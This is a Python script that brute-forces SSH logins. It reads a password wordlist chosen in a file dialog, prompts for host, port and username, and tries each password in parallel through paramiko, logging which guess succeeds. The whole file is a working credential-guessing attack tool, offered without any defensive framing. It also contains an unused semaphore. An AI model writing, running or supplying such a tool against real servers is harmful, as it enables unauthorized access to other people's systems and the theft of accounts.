import threading
import paramiko
import tkinter as tk
import logging
import time
from multiprocessing import Pool
from tkinter import filedialog

def ssh_connect(args):
    logger = logging.getLogger(__name__)
    password, hostname, port, username = args
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname, port=port, username=username, password=password, timeout=5, banner_timeout=10, auth_timeout=5, gss_trust_dns=True)
        logger.info("Connection successful! Password: %s", password)
        client.close()
        return password
    except paramiko.AuthenticationException:
        logger.warning("Incorrect password: %s", password)
        return None
    except paramiko.SSHException as e:
        logger.error("An error occurred while establishing SSH connection: %s", e)
        return None
    finally:
        time.sleep(1)  # sleep for 1 second to limit the number of concurrent connections

def get_password_file():
    logger = logging.getLogger(__name__)
    file_path = filedialog.askopenfilename(title="Select Password File")
    if not file_path:
        logger.error("No file selected. Exiting.")
        exit()
    return file_path

def get_connection_details():
    logger = logging.getLogger(__name__)
    hostname = input("Host name: ") or "example.com"
    port = int(input("Port: ") or "22")
    username = input("User name: ") or "user"
    return hostname, port, username

def main():
    logger = logging.getLogger(__name__)

    # Ask the user to select the password file
    file_path = get_password_file()

    # Prompt user for connection details
    hostname, port, username = get_connection_details()

    # Read passwords from the selected file
    with open(file_path, "r") as password_file:
        password_list = [password.strip() for password in password_file]

    # Prepare arguments for parallel processing
    args_list = [(password, hostname, port, username) for password in password_list]

    # Define a semaphore with a maximum limit of 10
    semaphore = threading.Semaphore(10)

    with Pool() as pool:
        results = []
        for result in pool.imap_unordered(ssh_connect, args_list):
            if result:
                results.append(result)

    if results:
        print("SSH connection successful!")
    else:
        print("Failed to establish SSH connection.")

if __name__ == "__main__":
    main()
